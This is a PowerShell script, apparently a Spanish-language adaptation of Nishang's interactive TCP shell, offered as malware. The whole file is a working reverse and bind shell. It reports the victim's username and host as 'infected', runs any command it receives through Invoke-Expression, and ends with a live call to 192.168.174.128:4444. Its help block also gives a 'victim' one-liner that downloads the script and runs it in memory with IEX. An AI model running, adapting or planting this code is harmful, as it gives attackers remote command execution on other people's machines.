function Invoke-SpartanPSTcp 
{ 
<#
.SYNOPSIS
Script de Nishang que puede ser utilizado para una conexión PowerShell interactiva de tipo Reverse o Bind desde un objetivo.

.DESCRIPTION
Este script es capaz de conectarse a un listener estándar de netcat que escucha en un puerto utilizando el parámetro -Reverse.
También permite que un netcat estándar se conecte a este script que está vinculado a un puerto específico.

El script se deriva de Powerfun, escrito por Ben Turner y Dave Hardy.

.PARAMETER IPAddress
La dirección IP a la cual conectarse al utilizar el parámetro -Reverse.

.PARAMETER Port
El puerto al cual conectarse al utilizar el parámetro -Reverse. Cuando se utiliza -Bind, es el puerto en el que este script escucha.

.EXAMPLE
PS > Invoke-SpartanPSTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

El ejemplo muestra una shell interactiva de PowerShell con conexión de tipo reverse. Debe haber un listener de netcat/powercat escuchando en la IP y puerto especificados.

.EXAMPLE
PS > Invoke-SpartanPSTcp -Bind -Port 4444

El ejemplo muestra una shell interactiva de PowerShell con conexión de tipo bind. Usa un netcat/powercat para conectarte a este puerto.

.EXAMPLE
PS > Invoke-SpartanPSTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

El ejemplo muestra una shell interactiva de PowerShell con conexión de tipo reverse sobre IPv6. Debe haber un listener de netcat/powercat escuchando en la IP y puerto especificados.

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang

.VICTIMA
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Spartan-Cybersecurity/Malware/main/Invoke-SpartanPSTcp.ps1')"

#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        # Parámetro de dirección IP, obligatorio para reverse, opcional para bind
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        # Parámetro de puerto, obligatorio tanto para reverse como para bind
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        # Switch para indicar conexión de tipo reverse
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        # Switch para indicar conexión de tipo bind
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        # Si se utiliza el switch Reverse, se crea una conexión hacia la IP y puerto especificados.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        # Si se utiliza el switch Bind, se inicia un listener en el puerto especificado y se espera una conexión entrante.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        # Obtiene el stream de datos desde el cliente
        $stream = $client.GetStream()
        # Crea un buffer para los datos recibidos
        [byte[]]$bytes = 0..65535|%{0}

        # Envía al cliente información sobre el usuario y la máquina actual
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Equipo Infectado via PowerShell ejecutandose como usuario " + $env:username + " en " + $env:computername + "`nSpartan-Cybersecurity.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        # Muestra un prompt interactivo de PowerShell
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        # Bucle para leer los comandos enviados desde el cliente y ejecutarlos
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            # Decodifica los datos recibidos
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                # Ejecuta el comando en la máquina objetivo y captura la salida
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                # Muestra una advertencia si ocurre un error durante la ejecución del comando
                Write-Warning "Algo salio mal al ejecutar el comando en el objetivo." 
                Write-Error $_
            }
            # Prepara la respuesta para enviarla de vuelta al cliente, incluyendo el prompt actualizado
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            # Envía los resultados de la ejecución al cliente
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        # Cierra la conexión con el cliente
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        # Muestra una advertencia y el error si ocurre algún problema durante el proceso
        Write-Warning "¡Algo salio mal! Verifica si el servidor es accesible y si estás utilizando el puerto correcto." 
        Write-Error $_
    }
}

Invoke-SpartanPSTcp -Reverse -IPAddress 192.168.174.128 -Port 4444
